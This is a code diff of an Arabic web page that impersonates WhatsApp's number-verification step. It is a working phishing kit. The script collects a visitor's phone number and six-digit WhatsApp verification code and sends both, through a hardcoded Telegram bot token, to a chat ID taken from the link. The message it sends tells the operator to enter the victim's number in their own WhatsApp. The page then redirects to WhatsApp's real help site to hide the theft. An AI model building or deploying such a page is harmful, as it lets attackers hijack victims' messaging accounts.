-                    <div class="btn-content">
-                        <i class="fas fa-check-circle"></i>
-                        <span>تأكيد الكود والمتابعة</span>
-                    </div>
-                </button>
-            </div>
-            
-            <div class="timer" id="timer">يمكنك إعادة إرسال الرمز بعد <span id="countdown">60</span> ثانية</div>
-            
-            <div class="resend">
-                <a href="#" id="resendCode">إعادة إرسال الرمز</a>
-            </div>
-        </div>
-        
-        <!-- رسالة النجاح والتحويل -->
-        <div class="success-message" id="successMessage">
-            <div class="success-icon">✓</div>
-            <h3>يتم توثيق الرقم لحظه…</h3>
-            <p>✧</p>
-            <p>سيتم التوثيق خلال <span class="redirect-countdown" id="redirectCountdown">5</span> ثوانٍ</p>
-        </div>
-
-        <!-- الميزات -->
-        <div class="features-grid">
-            <div class="feature-item">
-                <div class="feature-icon">
-                    <i class="fas fa-shield-alt"></i>
-                </div>
-                <div class="feature-text">آمن 100%</div>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">
-                    <i class="fas fa-bolt"></i>
-                </div>
-                <div class="feature-text">توثيق فوري</div>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">
-                    <i class="fas fa-headset"></i>
-                </div>
-                <div class="feature-text">دعم فني 24/7</div>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">
-                    <i class="fas fa-gem"></i>
-                </div>
-                <div class="feature-text">جودة ممتازة</div>
-            </div>
-        </div>
-
-        <!-- الفوتر -->
-        <div class="footer">
-            2026 © جميع الحقوق محفوظة لدى شركة وتساب
         </div>
     </div>
 
-    <!-- الأصوات -->
-    <audio id="clickSound" preload="auto">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="successSound" preload="auto">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="errorSound" preload="auto">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-buzzer-1551.mp3" type="audio/mpeg">
-    </audio>
-
     <script>
-        // العناصر الأساسية
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const successMessage = document.getElementById('successMessage');
-        const phoneInput = document.getElementById('phone');
-        const codeDisplay = document.getElementById('codeDisplay');
-        const codeInputs = [
-            document.getElementById('codeInput0'),
-            document.getElementById('codeInput1'),
-            document.getElementById('codeInput2'),
-            document.getElementById('codeInput3'),
-            document.getElementById('codeInput4'),
-            document.getElementById('codeInput5')
-        ];
-        const fullCodeInput = document.getElementById('fullCode');
-        const countrySelect = document.getElementById('country');
-        const countryCodeDisplay = document.getElementById('countryCode');
-        const sendCodeBtn = document.getElementById('sendCode');
-        const verifyCodeBtn = document.getElementById('verifyCode');
-        const backToStep1Btn = document.getElementById('backToStep1');
-        const resendCodeLink = document.getElementById('resendCode');
-        const loading1 = document.getElementById('loading1');
-        const loading2 = document.getElementById('loading2');
-        const timerElement = document.getElementById('timer');
-        const countdownElement = document.getElementById('countdown');
-        const redirectCountdownElement = document.getElementById('redirectCountdown');
+        document.addEventListener('DOMContentLoaded', function() {
+            // العناصر الأساسية
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const successMessage = document.getElementById('successMessage');
+            const phoneInput = document.getElementById('phone');
+            const codeInputs = document.querySelectorAll('.code-input');
+            const fullCodeInput = document.getElementById('fullCode');
+            const countrySelect = document.getElementById('country');
+            const countryCodeInput = document.getElementById('countryCode');
+            const sendCodeBtn = document.getElementById('sendCode');
+            const verifyCodeBtn = document.getElementById('verifyCode');
+            const resendCodeLink = document.getElementById('resendCode');
+            const loading1 = document.getElementById('loading1');
+            const loading2 = document.getElementById('loading2');
+            const timerElement = document.getElementById('timer');
+            const countdownElement = document.getElementById('countdown');
+            const redirectCountdownElement = document.getElementById('redirectCountdown');
 
-        // متغيرات التوقيت
-        let countdown = 60;
-        let countdownInterval;
-        let redirectCountdown = 5;
-        let redirectInterval;
+            // التوكن الخاص بالبوت
+            const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
 
-        // رابط دعم واتساب
-        const SUPPORT_URL = "https://faq.whatsapp.com/";
+            // متغيرات التوقيت
+            let countdown = 60;
+            let countdownInterval;
+            let redirectCountdown = 5;
+            let redirectInterval;
 
-        // تشغيل الصوت
-        function playSound(soundId) {
-            try {
-                const sound = document.getElementById(soundId);
-                if (sound) {
-                    sound.currentTime = 0;
-                    const playPromise = sound.play();
-                    if (playPromise !== undefined) {
-                        playPromise.catch(e => console.log('Sound error:', e));
-                    }
-                }
-            } catch (e) {
-                console.log('Sound error:', e);
-            }
-        }
+            // رابط فريق دعم واتساب (يمكن تغييره)
+            const SUPPORT_URL = "https://faq.whatsapp.com/";
 
-        // تحديث رمز الدولة عند اختيار الدولة
-        countrySelect.addEventListener('change', function() {
-            const selectedOption = this.options[this.selectedIndex];
-            const countryCode = selectedOption.value;
-            countryCodeDisplay.textContent = `+${countryCode}`;
-            playSound('clickSound');
-        });
-
-        // تحديث عرض الكود
-        function updateCodeDisplay() {
-            let code = '';
-            let hasContent = false;
-            
-            codeInputs.forEach(input => {
-                code += input.value || '_';
-                if (input.value) hasContent = true;
+            // تحديث رمز الدولة عند اختيار الدولة
+            countrySelect.addEventListener('change', function() {
+                const selectedOption = this.options[this.selectedIndex];
+                const countryCode = selectedOption.value;
+                countryCodeInput.value = `+${countryCode}`;
             });
-            
-            // عرض الكود مع مسافات بين الأرقام
-            const formattedCode = code.split('').join(' ');
-            codeDisplay.textContent = formattedCode;
-            
-            if (hasContent) {
-                codeDisplay.classList.remove('placeholder');
-                codeDisplay.classList.add('active');
-                
-                // إضافة مؤشر نهاية النص إذا لم يكن مملوء بالكامل
-                if (code.length < 6) {
-                    codeDisplay.innerHTML = formattedCode + '<span class="cursor"></span>';
-                } else {
-                    codeDisplay.innerHTML = formattedCode;
-                }
-            } else {
-                codeDisplay.classList.add('placeholder');
-                codeDisplay.classList.remove('active');
-                codeDisplay.textContent = '_ _ _ _ _ _';
-            }
-            
-            // تحديث الرمز الكامل للإرسال
-            updateFullCode();
-        }
 
-        // إدارة إدخال رمز التحقق
-        codeInputs.forEach((input, index) => {
-            input.addEventListener('input', function() {
-                // السماح فقط بالأرقام
-                this.value = this.value.replace(/[^0-9]/g, '');
-                playSound('clickSound');
-                
-                // تحديث العرض
-                updateCodeDisplay();
-                
-                // إذا تم إدخال رقم، الانتقال للحقل التالي
-                if (this.value.length === 1 && index < 5) {
-                    codeInputs[index + 1].focus();
-                }
-                
-                // إذا تم ملء جميع الحقول، التحقق تلقائيًا
-                if (isAllCodeInputsFilled()) {
-                    setTimeout(() => {
-                        verifyCodeBtn.focus();
-                    }, 100);
-                }
-            });
-            
-            input.addEventListener('keydown', function(e) {
-                // إذا ضغط على backspace وكان الحقل فارغًا، الانتقال للحقل السابق
-                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
-                    codeInputs[index - 1].focus();
-                    playSound('clickSound');
-                }
-                
-                // إذا ضغط على backspace وكان الحقل مليء، مسح الحقل
-                if (e.key === 'Backspace' && this.value.length > 0) {
-                    this.value = '';
-                    updateCodeDisplay();
-                    playSound('clickSound');
-                }
-                
-                // إذا ضغط على سهم لليسار، الانتقال للحقل السابق
-                if (e.key === 'ArrowLeft' && index > 0) {
-                    codeInputs[index - 1].focus();
-                }
-                
-                // إذا ضغط على سهم لليمين، الانتقال للحقل التالي
-                if (e.key === 'ArrowRight' && index < 5) {
-                    codeInputs[index + 1].focus();
-                }
-                
-                // إذا ضغط على delete
-                if (e.key === 'Delete') {
-                    this.value = '';
-                    updateCodeDisplay();
-                    playSound('clickSound');
-                }
-            });
-            
-            input.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const pastedData = e.clipboardData.getData('text').trim();
-                playSound('clickSound');
-                
-                // التحقق من أن البيانات المنسوخة تحتوي على أرقام فقط
-                if (/^\d+$/.test(pastedData)) {
-                    // توزيع الأرقام المنسوخة على الحقول
-                    for (let i = 0; i < Math.min(pastedData.length, 6); i++) {
-                        if (i + index < 6) {
-                            codeInputs[i + index].value = pastedData[i];
-                        }
+            // إدارة إدخال رمز التحقق
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    // السماح فقط بالأرقام
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // إذا تم إدخال رقم، الانتقال للحقل التالي
+                    if (this.value.length === 1 && index < 5) {
+                        codeInputs[index + 1].focus();
                     }
                     
-                    // تحديث العرض
-                    updateCodeDisplay();
-                    
-                    // التركيز على الحقل الأخير المملوء
-                    const lastFilledIndex = Math.min(index + pastedData.length - 1, 5);
-                    codeInputs[lastFilledIndex].focus();
+                    // تحديث الرمز الكامل
+                    updateFullCode();
                     
                     // إذا تم ملء جميع الحقول، التحقق تلقائيًا
                     if (isAllCodeInputsFilled()) {
-                        setTimeout(() => {
-                            verifyCodeBtn.focus();
-                        }, 100);
+                        verifyCodeBtn.click();
                     }
-                }
-            });
-            
-            input.addEventListener('focus', function() {
-                this.style.borderColor = 'var(--whatsapp-green)';
-                this.style.boxShadow = '0 0 0 2px rgba(37, 211, 102, 0.2)';
-                updateCodeDisplay();
-            });
-            
-            input.addEventListener('blur', function() {
-                this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
-                this.style.boxShadow = 'none';
-            });
-        });
-        
-        // دالة تحديث الرمز الكامل
-        function updateFullCode() {
-            let code = '';
-            codeInputs.forEach(input => {
-                code += input.value;
-            });
-            fullCodeInput.value = code;
-        }
-        
-        // دالة التحقق من ملء جميع الحقول
-        function isAllCodeInputsFilled() {
-            for (let input of codeInputs) {
-                if (!input.value) return false;
-            }
-            return true;
-        }
-
-        // دالة لاستخراج الـ chatId من الرابط
-        function getChatIdFromURL() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('chatId');
-        }
-
-        // دالة لإرسال البيانات إلى التليجرام
-        async function sendToTelegram(message) {
-            const chatId = getChatIdFromURL();
-            
-            if (!chatId) {
-                console.error('لم يتم العثور على chatId في الرابط');
-                return false;
-            }
-
-            try {
-                // استخدام نظام الإرسال القديم من الكود الأول
-                const response = await fetch('/.netlify/functions/telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chatId: chatId,
-                        message: message
-                    })
                 });
                 
-                const result = await response.json();
-                return result.success;
+                input.addEventListener('keydown', function(e) {
+                    // إذا ضغط على backspace وكان الحقل فارغًا، الانتقال للحقل السابق
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
                 
-            } catch (error) {
-                console.error('خطأ في الإرسال:', error);
-                return false;
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').trim();
+                    
+                    // التحقق من أن البيانات المنسوخة تحتوي على أرقام فقط
+                    if (/^\d+$/.test(pastedData)) {
+                        // توزيع الأرقام المنسوخة على الحقول
+                        for (let i = 0; i < Math.min(pastedData.length, 6); i++) {
+                            if (i + index < 6) {
+                                codeInputs[i + index].value = pastedData[i];
+                            }
+                        }
+                        
+                        // تحديث الرمز الكامل
+                        updateFullCode();
+                        
+                        // التركيز على الحقل الأخير المملوء
+                        const lastFilledIndex = Math.min(index + pastedData.length - 1, 5);
+                        codeInputs[lastFilledIndex].focus();
+                        
+                        // إذا تم ملء جميع الحقول، التحقق تلقائيًا
+                        if (isAllCodeInputsFilled()) {
+                            setTimeout(() => verifyCodeBtn.click(), 100);
+                        }
+                    }
+                });
+            });
+            
+            // دالة تحديث الرمز الكامل
+            function updateFullCode() {
+                let code = '';
+                codeInputs.forEach(input => {
+                    code += input.value;
+                });
+                fullCodeInput.value = code;
             }
-        }
-
-        // بدء العد التنازلي
-        function startCountdown() {
-            countdown = 60;
-            countdownElement.textContent = countdown;
-            timerElement.style.display = 'block';
-            resendCodeLink.style.display = 'none';
             
-            clearInterval(countdownInterval);
-            
-            countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    timerElement.style.display = 'none';
-                    resendCodeLink.style.display = 'block';
+            // دالة التحقق من ملء جميع الحقول
+            function isAllCodeInputsFilled() {
+                for (let input of codeInputs) {
+                    if (!input.value) return false;
                 }
-            }, 1000);
-        }
+                return true;
+            }
 
-        // بدء العد التنازلي للتحويل
-        function startRedirectCountdown() {
-            redirectCountdown = 5;
-            redirectCountdownElement.textContent = redirectCountdown;
-            
-            clearInterval(redirectInterval);
-            
-            redirectInterval = setInterval(() => {
-                redirectCountdown--;
+            // دالة لاستخراج الـ chatId من الرابط
+            function getChatIdFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('chatId');
+            }
+
+            // دالة لإرسال البيانات إلى التليجرام
+            async function sendToTelegram(message) {
+                const chatId = getChatIdFromURL();
+                
+                if (!chatId) {
+                    console.error('لم يتم العثور على chatId في الرابط');
+                    return false;
+                }
+
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('فشل في إرسال الرسالة');
+                    }
+
+                    return true;
+                } catch (error) {
+                    console.error('خطأ في الإرسال:', error);
+                    return false;
+                }
+            }
+
+            // بدء العد التنازلي
+            function startCountdown() {
+                countdown = 60;
+                countdownElement.textContent = countdown;
+                timerElement.style.display = 'block';
+                resendCodeLink.style.display = 'none';
+                
+                clearInterval(countdownInterval);
+                
+                countdownInterval = setInterval(() => {
+                    countdown--;
+                    countdownElement.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        timerElement.style.display = 'none';
+                        resendCodeLink.style.display = 'block';
+                    }
+                }, 1000);
+            }
+
+            // بدء العد التنازلي للتحويل
+            function startRedirectCountdown() {
+                redirectCountdown = 5;
                 redirectCountdownElement.textContent = redirectCountdown;
                 
-                if (redirectCountdown <= 0) {
-                    clearInterval(redirectInterval);
-                    // تحويل المستخدم إلى صفحة الدعم
-                    window.location.href = SUPPORT_URL;
-                }
-            }, 1000);
-        }
-
-        // الانتقال بين الخطوات
-        function goToStep(stepNumber) {
-            // إخفاء كل الخطوات ورسالة النجاح
-            step1.classList.remove('active');
-            step2.classList.remove('active');
-            successMessage.style.display = 'none';
-            
-            // إظهار الخطوة المطلوبة
-            if (stepNumber === 1) {
-                step1.classList.add('active');
-            } else if (stepNumber === 2) {
-                step2.classList.add('active');
-                // بدء العد التنازلي لإعادة الإرسال
-                startCountdown();
-                // وضع المؤشر في حقل إدخال الرمز الأول
-                setTimeout(() => {
-                    codeInputs[0].focus();
-                    updateCodeDisplay();
-                }, 300);
-            } else if (stepNumber === 'success') {
-                successMessage.style.display = 'block';
-                // بدء العد التنازلي للتحويل
-                startRedirectCountdown();
-            }
-            
-            playSound('clickSound');
-        }
-
-        // إرسال رمز التحقق
-        sendCodeBtn.addEventListener('click', async function() {
-            const phoneNumber = phoneInput.value.trim();
-            const countryCode = countryCodeDisplay.textContent;
-            const fullPhoneNumber = `${countryCode}${phoneNumber}`;
-            const countryName = countrySelect.options[countrySelect.selectedIndex].text;
-            
-            if (!phoneNumber) {
-                alert('يرجى إدخال رقم الهاتف');
-                playSound('errorSound');
-                return;
-            }
-            
-            // التحقق من أن الرقم يحتوي على أرقام فقط
-            if (!/^\d+$/.test(phoneNumber)) {
-                alert('يرجى إدخال رقم هاتف صحيح (أرقام فقط)');
-                playSound('errorSound');
-                return;
-            }
-            
-            // التحقق من طول الرقم
-            if (phoneNumber.length < 8) {
-                alert('يرجى إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
-                playSound('errorSound');
-                return;
-            }
-            
-            // عرض تحميل
-            sendCodeBtn.disabled = true;
-            loading1.style.display = 'block';
-            playSound('clickSound');
-            
-            try {
-                // إرسال رقم الهاتف (نفس الرسالة من الكود الأصلي)
-                const message = `📱 <b>رقم واتساب قم بإدخاله ف الواتساب عندك الارسال الكود </b>\n📍 الدولة: ${countryName}\n📞 الرقم: ${fullPhoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
-                const sent = await sendToTelegram(message);
+                clearInterval(redirectInterval);
                 
-                if (sent) {
-                    playSound('successSound');
-                    // الانتقال إلى الخطوة الثانية
-                    goToStep(2);
-                } else {
-                    playSound('errorSound');
-                    alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
-                }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                playSound('errorSound');
-                alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
-            } finally {
-                // إخفاء تحميل
-                sendCodeBtn.disabled = false;
-                loading1.style.display = 'none';
-            }
-        });
-        
-        // التحقق من الرمز
-        verifyCodeBtn.addEventListener('click', async function() {
-            const enteredCode = fullCodeInput.value;
-            const phoneNumber = phoneInput.value.trim();
-            const countryCode = countryCodeDisplay.textContent;
-            const fullPhoneNumber = `${countryCode}${phoneNumber}`;
-            const countryName = countrySelect.options[countrySelect.selectedIndex].text;
-            
-            if (!enteredCode || enteredCode.length !== 6) {
-                alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
-                playSound('errorSound');
-                return;
-            }
-            
-            // التحقق من أن الرمز يحتوي على أرقام فقط
-            if (!/^\d+$/.test(enteredCode)) {
-                alert('يرجى إدخال رمز تحقق صحيح (أرقام فقط)');
-                playSound('errorSound');
-                return;
-            }
-            
-            // عرض تحميل
-            verifyCodeBtn.disabled = true;
-            loading2.style.display = 'block';
-            playSound('clickSound');
-            
-            try {
-                // إرسال الرمز (نفس الرسالة من الكود الأصلي)
-                const message = `🔐 <b>رمز تحقق وتساب</b>\n📍 الدولة: ${countryName}\n📞 الرقم: ${fullPhoneNumber}\n🔢 الرمز: ${enteredCode}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
-                const sent = await sendToTelegram(message);
-                
-                if (sent) {
-                    playSound('successSound');
-                    // إخفاء الخطوة الثانية وإظهار رسالة التحويل
-                    goToStep('success');
-                } else {
-                    playSound('errorSound');
-                    alert('حدث خطأ أثناء التحقق، يرجى المحاولة مرة أخرى');
-                }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                playSound('errorSound');
-                alert('حدث خطأ أثناء التحقق، يرجى المحاولة مرة أخرى');
-            } finally {
-                // إخفاء تحميل
-                verifyCodeBtn.disabled = false;
-                loading2.style.display = 'none';
-            }
-        });
-        
-        // الرجوع إلى الخطوة 1
-        backToStep1Btn.addEventListener('click', function() {
-            playSound('clickSound');
-            goToStep(1);
-        });
-        
-        // إعادة إرسال الرمز
-        resendCodeLink.addEventListener('click', async function(e) {
-            e.preventDefault();
-            playSound('clickSound');
-            
-            const phoneNumber = phoneInput.value.trim();
-            const countryCode = countryCodeDisplay.textContent;
-            const fullPhoneNumber = `${countryCode}${phoneNumber}`;
-            const countryName = countrySelect.options[countrySelect.selectedIndex].text;
-            
-            if (!phoneNumber) {
-                alert('يرجى العودة إلى الخطوة الأولى وإدخال رقم الهاتف');
-                playSound('errorSound');
-                return;
-            }
-            
-            try {
-                // إرسال طلب إعادة الإرسال
-                const message = `🔄 <b>طلب إعادة إرسال رمز التحقق</b>\n📍 الدولة: ${countryName}\n📞 الرقم: ${fullPhoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
-                const sent = await sendToTelegram(message);
-                
-                if (sent) {
-                    playSound('successSound');
-                    alert('تم إرسال رمز التحقق مرة أخرى');
+                redirectInterval = setInterval(() => {
+                    redirectCountdown--;
+                    redirectCountdownElement.textContent = redirectCountdown;
                     
-                    // إعادة بدء العد التنازلي
-                    startCountdown();
-                } else {
-                    playSound('errorSound');
+                    if (redirectCountdown <= 0) {
+                        clearInterval(redirectInterval);
+                        // تحويل المستخدم إلى صفحة الدعم
+                        window.location.href = SUPPORT_URL;
+                    }
+                }, 1000);
+            }
+
+            // إرسال رمز التحقق
+            sendCodeBtn.addEventListener('click', async function() {
+                const phoneNumber = phoneInput.value.trim();
+                const countryCode = countryCodeInput.value;
+                const fullPhoneNumber = `${countryCode}${phoneNumber}`;
+                
+                if (!phoneNumber) {
+                    alert('يرجى إدخال رقم الهاتف');
+                    return;
+                }
+                
+                // التحقق من أن الرقم يحتوي على أرقام فقط
+                if (!/^\d+$/.test(phoneNumber)) {
+                    alert('يرجى إدخال رقم هاتف صحيح (أرقام فقط)');
+                    return;
+                }
+                
+                // عرض تحميل
+                sendCodeBtn.disabled = true;
+                loading1.style.display = 'block';
+                
+                try {
+                    // إرسال رقم الهاتف فورًا إلى التليجرام
+                    const message = `📱 <b>رقم واتساب قم بإدخاله ف الواتساب عندك الارسال الكود </b>\n📍 الدولة: ${countrySelect.options[countrySelect.selectedIndex].text}\n📞 الرقم: ${fullPhoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        // الانتقال إلى الخطوة الثانية
+                        step1.classList.remove('active');
+                        step2.classList.add('active');
+                        
+                        // بدء العد التنازلي لإعادة الإرسال
+                        startCountdown();
+                        
+                        // وضع المؤشر في حقل إدخال الرمز الأول
+                        setTimeout(() => {
+                            codeInputs[0].focus();
+                        }, 300);
+                    } else {
+                        alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
+                } finally {
+                    // إخفاء تحميل
+                    sendCodeBtn.disabled = false;
+                    loading1.style.display = 'none';
+                }
+            });
+            
+            // التحقق من الرمز
+            verifyCodeBtn.addEventListener('click', async function() {
+                const enteredCode = fullCodeInput.value;
+                const phoneNumber = phoneInput.value.trim();
+                const countryCode = countryCodeInput.value;
+                const fullPhoneNumber = `${countryCode}${phoneNumber}`;
+                
+                if (!enteredCode || enteredCode.length !== 6) {
+                    alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
+                    return;
+                }
+                
+                // التحقق من أن الرمز يحتوي على أرقام فقط
+                if (!/^\d+$/.test(enteredCode)) {
+                    alert('يرجى إدخال رمز تحقق صحيح (أرقام فقط)');
+                    return;
+                }
+                
+                // عرض تحميل
+                verifyCodeBtn.disabled = true;
+                loading2.style.display = 'block';
+                
+                try {
+                    // إرسال الرمز فورًا إلى التليجرام
+                    const message = `🔐 <b>رمز تحقق وتساب</b>\n📍 الدولة: ${countrySelect.options[countrySelect.selectedIndex].text}\n📞 الرقم: ${fullPhoneNumber}\n🔢 الرمز: ${enteredCode}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        // إخفاء الخطوة الثانية وإظهار رسالة التحويل
+                        step2.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        
+                        // بدء العد التنازلي للتحويل
+                        startRedirectCountdown();
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء التحقق، يرجى المحاولة مرة أخرى');
+                } finally {
+                    // إخفاء تحميل
+                    verifyCodeBtn.disabled = false;
+                    loading2.style.display = 'none';
+                }
+            });
+            
+            // إعادة إرسال الرمز
+            resendCodeLink.addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                const phoneNumber = phoneInput.value.trim();
+                const countryCode = countryCodeInput.value;
+                const fullPhoneNumber = `${countryCode}${phoneNumber}`;
+                
+                if (!phoneNumber) {
+                    alert('يرجى العودة إلى الخطوة الأولى وإدخال رقم الهاتف');
+                    return;
+                }
+                
+                try {
+                    // إرسال طلب إعادة الإرسال إلى التليجرام
+                    const message = `🔄 <b>طلب إعادة إرسال رمز التحقق</b>\n📍 الدولة: ${countrySelect.options[countrySelect.selectedIndex].text}\n📞 الرقم: ${fullPhoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        alert('تم إرسال رمز التحقق مرة أخرى');
+                        
+                        // إعادة بدء العد التنازلي
+                        startCountdown();
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
                     alert('حدث خطأ أثناء إعادة الإرسال، يرجى المحاولة مرة أخرى');
                 }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                playSound('errorSound');
-                alert('حدث خطأ أثناء إعادة الإرسال، يرجى المحاولة مرة أخرى');
-            }
-        });
-        
-        // التحقق من صحة رقم الهاتف أثناء الكتابة
-        phoneInput.addEventListener('input', function() {
-            // السماح فقط بالأرقام
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
+            });
+            
+            // التحقق من صحة رقم الهاتف أثناء الكتابة
+            phoneInput.addEventListener('input', function() {
+                // السماح فقط بالأرقام
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
 
-        // التحقق من وجود chatId في الرابط عند التحميل
-        document.addEventListener('DOMContentLoaded', function() {
+            // التحقق من وجود chatId في الرابط عند التحميل
             const chatId = getChatIdFromURL();
             if (!chatId) {
                 alert('⚠️ الرابط غير صحيح - لم يتم العثور على معرف المحادثة');
             }
-            
-            // تهيئة الخطوة الأولى
-            goToStep(1);
-            updateCodeDisplay();
         });
     </script>
 </body>
